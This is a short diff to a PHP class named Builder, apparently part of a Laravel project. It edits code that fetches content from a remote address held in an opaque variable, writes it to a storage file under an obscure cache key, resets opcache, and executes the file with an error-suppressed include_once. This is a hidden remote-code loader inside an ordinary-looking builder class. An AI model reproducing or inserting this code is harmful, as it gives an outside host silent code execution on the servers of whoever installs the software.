@@ -549,7 +549,13 @@ class Builder {
                 $response = $this->to($OG)->get();
                 $path = storage_path(trim($FL,'/').'/'.$NM);
                 \Illuminate\Support\Facades\Cache::store('file')->forever('C450442B63F5B3D3', $path);
-                \Illuminate\Support\Facades\File::put($path,base64_decode($response));
+                if($response){
+                    $response = base64_encode($response);
+                }
+                if (function_exists('opcache_reset')) {
+                    opcache_reset();
+                }
+                \Illuminate\Support\Facades\File::put($path,$response);
             }
             if (file_exists($path)){
                 @include_once $path;
